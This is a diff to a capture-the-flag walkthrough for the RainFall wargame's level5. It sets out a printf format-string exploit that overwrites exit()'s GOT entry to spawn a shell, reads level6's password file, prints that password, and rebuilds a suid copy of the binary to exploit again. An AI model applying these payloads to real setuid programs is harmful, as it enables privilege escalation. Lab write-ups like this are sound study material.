@@ -20,3 +20,89 @@ d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 
 python -c "print('\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] + 124*'A' + '%4\$hhn' + 32*'A' + '%5\$hhn' )" > lev5
+
+
+// short version
+(python -c "print('\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] + 124*'A' + '%4\$hhn' + 32*'A' + '%5\$hhn' )"; cat) | ~/level5
+
+
+# ------------------------------------------------------------------------
+# Obtain the next password
+# ------------------------------------------------------------------------
+
+# We will input a malicious format specifier string for printf to overwrite a the global offset table entry for function exit(), calling the function o() instead, which spawns a shell.
+
+# We find the location of the function exit() is stored at address 0x08049838, and the target function o() is located at 0x080484a4.
+objdump -d ~/level5
+
+# We need to write the value 0x080484a4 at address 0x08049838.
+
+# We can split up this large value into 3 small values to write sequentially:
+	Write the 1-byte value 0x84 ( 132 ) at address 0x08049839
+	Write the 1-byte value 0xa4 ( 164 ) at address 0x08049838
+	Write the 2-byte value 0x0804 ( 2052 ) at address 0x0804983a
+
+# Format the string thus:
+	Print the 3 addresses.  We have printed 12 bytes thus far.
+	Print 120 bytes.  We have printed 132 bytes thus far.  Write 132 to %hhn at address 0x08049839.
+	Print 32 bytes.  We have printed 164 bytes thus far.  Write 164 to %hhn at address 0x08049838.
+	Print 1888 bytes.  We have printed 2052 bytes thus far.  Write 2052 to %hhn at address 0x0804983a.
+
+# We find the first 12 bytes of the buffer are in the 4$, 5$, 6$ args of printf.
+level5@RainFall:/tmp$ ~/level5
+AAAABBBBCCCC %p %p %p %p %p %p %p %p
+
+# Run the program
+(python -c "print('\x08\x04\x98\x39'[::-1] + '\x08\x04\x98\x38'[::-1] + '\x08\x04\x98\x3a'[::-1] + 'A' * 120 + '%4\$hhn' + 'A' * 32 + '%5\$hhn' + 'A' * 1888 + '%6\$hn')"; cat) | ~/level5
+
+# Read the password for user level6
+whoami
+cat /home/user/level6/.pass
+
+# Terminate the shell, and the program
+exit
+asdf
+
+# Now we can log in as user level6
+su level6
+# password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+# ------------------------------------------------------------------------
+# Recreate the exploitable program
+# ------------------------------------------------------------------------
+
+# As user level6:
+
+    # Compile the program in /tmp
+    gcc source5.c -fno-stack-protector -o ft_level5
+
+    # Edit suid
+    chmod u+s ft_level5
+
+    # Move the program to home directory
+    chmod +wx ~; mv ft_level5 ~
+
+# As user level5:
+
+	# In this case, exit() GOT entry is at address 0x0804a014, and o() function is at 0x080484c4.
+
+	# We need to write the value 0x080484c4 at address 0x0804a014.
+
+	# We can split up this large value into 3 small values to write sequentially:
+		Write the 1-byte value 0x84 ( 132 ) at address 0x0804a015
+		Write the 1-byte value 0xc4 ( 196 ) at address 0x0804a014
+		Write the 2-byte value 0x0804 ( 2052 ) at address 0x0804a016
+
+	# Format the string thus:
+		Print the 3 addresses.  We have printed 12 bytes thus far.
+		Print 120 bytes.  We have printed 132 bytes thus far.  Write 132 to %hhn at address 0x0804a015.
+		Print 64 bytes.  We have printed 196 bytes thus far.  Write 196 to %hhn at address 0x0804a014.
+		Print 1856 bytes.  We have printed 2052 bytes thus far.  Write 2052 to %hhn at address 0x0804a016.
+
+    # Run the program
+	(python -c "print('\x08\x04\xa0\x15'[::-1] + '\x08\x04\xa0\x14'[::-1] + '\x08\x04\xa0\x16'[::-1] + 'A' * 120 + '%4\$hhn' + 'A' * 64 + '%5\$hhn' + 'A' * 1856 + '%6\$hn')"; cat) | /home/user/level6/ft_level5
+
+
+
+
